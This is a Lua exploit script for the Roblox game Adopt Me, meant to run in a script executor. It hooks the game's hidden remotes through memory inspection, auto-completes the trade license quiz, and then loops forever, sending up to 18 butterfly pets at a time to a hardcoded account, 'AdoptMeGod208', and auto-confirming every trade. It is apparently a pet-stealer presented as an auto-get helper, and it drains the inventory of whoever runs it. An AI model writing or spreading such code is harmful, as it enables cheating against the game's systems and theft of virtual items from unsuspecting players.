
getgenv().PlayerToTrade = "AdoptMeGod208"

if not getgenv().AutoGet then
    getgenv().AutoGet = true

    -- 🌐 Remote Router Discovery
    local router
    for _, v in next, getgc(true) do
        if type(v) == "table" and rawget(v, "get_remote_from_cache") then
            router = v
            break
        end
    end

    -- 🏷️ Rename Remotes
    local function rename(name, remote)
        remote.Name = name
    end

    table.foreach(debug.getupvalue(router.get_remote_from_cache, 1), rename)

    -- 📦 Client Data
    local ClientData = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
    local playerName = game.Players.LocalPlayer.Name
    local SocialStones = ClientData.get_data()[playerName].social_stones_2025
    local StonesToBuy = math.floor(SocialStones / 25)

    if StonesToBuy > 0 then
        game:GetService("ReplicatedStorage"):WaitForChild("API")
            :WaitForChild("SocialStonesAPI/AttemptExchange")
            :FireServer("food", "butterfly_2025_snapdragon_flower", StonesToBuy)
    end

    task.wait(1)

    local FoodData = ClientData.get_data()[playerName].inventory.food
    task.wait(3)

    for _, item in pairs(FoodData) do
        if item.id == "butterfly_2025_snapdragon_flower" then
            game:GetService("ReplicatedStorage"):WaitForChild("API")
                :WaitForChild("LootBoxAPI/ExchangeItemForReward")
                :InvokeServer("butterfly_2025_snapdragon_flower", item.unique)
            task.wait(.1)
        end
    end

    -- 🐾 Team Spawn
    task.wait(2)
    game:GetService("ReplicatedStorage"):WaitForChild("API")
        :WaitForChild("TeamAPI/Spawn"):InvokeServer()

    -- 🎓 Trade License Quiz
    task.wait(1)
    local fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load

    fsys("RouterClient").get("SettingsAPI/SetBooleanFlag")
        :FireServer("has_talked_to_trade_quest_npc", true)

    task.wait()
    fsys("RouterClient").get("TradeAPI/BeginQuiz"):FireServer()
    task.wait(1)

    local quizData = fsys("ClientData").get("trade_license_quiz_manager")
    local quiz = quizData and quizData.quiz

    if quiz then
        for _, question in pairs(quiz) do
            fsys("RouterClient").get("TradeAPI/AnswerQuizQuestion")
                :FireServer(question.answer)
            task.wait()
        end
    else
        warn("⚠️ Trade quiz data not found!")
    end

    -- 🐶 Setup Pet APIs
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local CreatePetObject = ReplicatedStorage:WaitForChild("API"):WaitForChild("PetObjectAPI/CreatePetObject")
    local EquipPet = ReplicatedStorage:WaitForChild("API"):WaitForChild("ToolAPI/Equip")

    task.wait(5)

    -- 🔁 Infinite Trade Loop
    while true do
        local pets = ClientData.get_data()[playerName].inventory.pets
        local availableBoxes = {}

        for _, pet in pairs(pets) do
            if table.find({
                "butterfly_2025_moonbeam_butterfly",
                "butterfly_2025_prismatic_butterfly",
                "butterfly_2025_amber_butterfly",
                "butterfly_2025_blue_butterfly",
                "butterfly_2025_seafoam_butterfly"
            }, pet.kind) then
                table.insert(availableBoxes, pet.unique)
            end
        end

        if #availableBoxes == 0 then
            print("No kaijunior boxes found, retrying...")
            task.wait(10)
            continue
        end

        -- 🔄 Trade Attempt
        game:GetService("ReplicatedStorage"):WaitForChild("API")
            :WaitForChild("TradeAPI/SendTradeRequest")
            :FireServer(game.Players:WaitForChild(getgenv().PlayerToTrade))

        task.wait(5)

        local toTradeCount = math.min(18, #availableBoxes)
        for i = 1, toTradeCount do
            game:GetService("ReplicatedStorage"):WaitForChild("API")
                :WaitForChild("TradeAPI/AddItemToOffer")
                :FireServer(availableBoxes[i])
            task.wait(0.1)
        end

        task.wait(5)
        game:GetService("ReplicatedStorage"):WaitForChild("API")
            :WaitForChild("TradeAPI/AcceptNegotiation")
            :FireServer()

        task.wait(5)
        game:GetService("ReplicatedStorage"):WaitForChild("API")
            :WaitForChild("TradeAPI/ConfirmTrade")
            :FireServer()

        print("✅ Traded", toTradeCount, "kaijunior boxes.")
        task.wait(5)
    end
end
